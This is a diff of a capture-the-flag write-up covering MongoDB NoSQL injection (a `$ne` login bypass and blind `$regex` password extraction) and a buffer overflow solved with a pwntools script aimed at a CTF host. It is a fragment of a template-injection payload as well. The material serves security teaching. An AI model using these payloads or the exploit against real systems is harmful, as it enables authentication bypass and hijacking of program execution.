@@ -115,7 +115,7 @@ Remove the attribute `type="email"`, and input `{{ request['application']['__glo
 > 
 > The goal is to successfully login and view the admin page.
 
-The description hints to a injection on NoSQL queries, most likely MongoDB.
+The description hints to a injection on NoSQL queries, most likely MongoDB. The backend has no type validation on user input, so we can inject conditions in the MongoDB queries.
 
 Open the debugger in your browser and set a breakpoint on the `$.ajax` call within `main.js`.
 
@@ -136,7 +136,7 @@ loginForm.username = loginForm.password = {"$ne": null};
 > 
 > The flag is the password, only has *lower and upper case letters* and will start with `CTF`.
 
-This also requires MongoDB injection; Mongo allows for a `$regex` operator in matcihng, and we can perform a blind injection (observing whether inputs are true or false) in order to retrieve the password character by character.
+This also requires MongoDB injection; Mongo allows for a `$regex` operator in matching, and we can perform a blind injection (observing whether inputs are true or false) in order to retrieve the password character by character.
 
 We first need to retrieve the length of the password. This can be done by matching for `.{n}`, where n is an incrementing number. If n+1 fails to authenticate, then n is the length of the password.
 
@@ -191,23 +191,24 @@ Flag: `CTFnosqlregexking`
 
 ## SecureApp PWN (20 points)
 
-The developers of SecureApp aren't too secure with their C programs. I was able to cause a **segmentation fault** error somehow and analysing the functions shows there is a very interesting one called `exploitme`.
+> The developers of SecureApp aren't too secure with their C programs. I was able to cause a **segmentation fault** error somehow and analysing the functions shows there is a very interesting one called `exploitme`.
+> 
+> **Can you exploit the buffer overflow vulnerability and execute the `exploitme` function?**
 
-**Can you exploit the buffer overflow vulnerability and execute the `exploitme` function?**
+Recall that function call stack frames are laid out in the following order: local variables, *the address to return to when the function finishes execution*, then the function's parameters.
 
-We are supposed to buffer overflow in order to jump to the exploitme function:
+We are supposed to buffer overflow the return address in order to jump to the exploitme function:
 
 ```py
-from pwn import remote, ELF, ROP
+from pwn import remote, ELF, p64
 
 
-(rop := ROP(binary := ELF("./secureapp"))).call(binary.symbols['exploitme'])
-
-(io := remote("cits4projtg.cybernemosyne.xyz", 1002)).recvuntil("Password: ")
-io.send(b"\n") # Fail password check
-io.recvuntil("Name: ")
-io.sendline(b"A" * 120 + rop.chain()) # offset from decompilation
-io.interactive()
+(io := remote("cits4projtg.cybernemosyne.xyz", 1002)).recvuntil(b"Password: ")
+io.send(b"\n")
+io.recvuntil(b"Name: ")
+io.sendline(b"A" * 120 + p64(ELF("./secureapp").symbols['exploitme'])) # Offset known from disassembly
+print(io.recvall().decode())
+io.close()
 ```
 
 Flag: `CTF{pwN3D_uR_w3aK_C_aPpLiC4sHon!11!}`
